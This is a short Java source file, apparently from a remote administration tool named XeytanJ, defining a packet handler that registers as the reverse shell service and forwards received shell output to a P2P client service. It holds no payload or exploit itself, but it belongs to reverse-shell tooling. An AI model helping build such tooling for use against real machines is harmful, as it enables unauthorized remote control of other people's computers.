package com.melardev.xeytanj.services.net.transport.p2p.handlers;


import com.melardev.xeytanj.enums.ServiceType;
import com.melardev.xeytanj.net.packets.PacketShell;
import com.melardev.xeytanj.services.net.PacketHandler;
import com.melardev.xeytanj.services.net.transport.p2p.P2PClientService;

public class XeytanShellClientHandler extends Thread implements PacketHandler<PacketShell> {


    private P2PClientService netClientService;

    public XeytanShellClientHandler(P2PClientService netClientService) {
        this.netClientService = netClientService;
    }

    @Override
    public ServiceType getServiceType() {
        return ServiceType.REVERSE_SHELL;
    }

    @Override
    public void handlePacket(PacketShell packet) {
        netClientService.onClientShellInfoReceived(packet.getResult());
    }

}
